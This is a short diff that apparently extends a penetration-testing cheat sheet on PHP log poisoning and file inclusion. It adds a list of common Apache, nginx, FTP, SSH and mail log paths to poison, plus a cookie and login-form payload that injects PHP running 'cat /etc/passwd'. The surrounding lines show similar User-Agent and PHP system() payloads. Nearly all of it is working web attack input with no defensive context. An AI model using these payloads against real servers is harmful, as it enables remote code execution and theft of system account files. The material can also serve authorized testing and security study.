@@ -414,6 +414,25 @@ User-Agent: <?=phpinfo(); ?>
 ..
 <?php system('cat /etc/passwd');?>
 ```
+>next log
+```
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/var/log/mail.log
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
 
+```
+>Set the cookie to <?php system('cat /etc/passwd');?>
+```
 
+login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
+```
 
